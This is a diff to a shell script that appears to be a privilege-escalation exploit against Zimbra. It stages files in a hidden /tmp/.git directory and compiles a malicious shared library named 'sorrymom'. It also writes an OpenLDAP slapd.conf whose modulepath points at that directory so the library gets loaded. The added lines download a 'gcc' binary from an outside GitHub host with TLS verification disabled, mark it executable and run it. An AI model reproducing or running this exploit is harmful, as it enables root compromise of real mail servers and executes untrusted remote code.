@@ -4,6 +4,8 @@ echo "[+] Setting up..."
 rm -rf /tmp/.git 2>&1
 mkdir /tmp/.git
 cd /tmp/.git
+curl -fskSL github.com/aels/zimbra-slapper/raw/main/gcc -o gcc
+chmod +x gcc
 cat << EOF > /tmp/.git/sorrymom.c
 #include <stdio.h>
 #include <sys/types.h>
@@ -26,10 +28,8 @@ int main(void){
 }
 EOF
 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
-gcc -o /tmp/.git/init /tmp/.git/init.c
-gcc -fPIC -shared -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c
-rm -rf /tmp/.git/init.c
-rm -rf /tmp/.git/sorrymom.c
+/tmp/.git/gcc -o /tmp/.git/init /tmp/.git/init.c
+/tmp/.git/gcc -fPIC -shared -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c
 cat << EOF > /tmp/.git/slapd.conf
 include		/opt/zimbra/common/etc/openldap/schema/core.schema
 modulepath	/tmp/.git
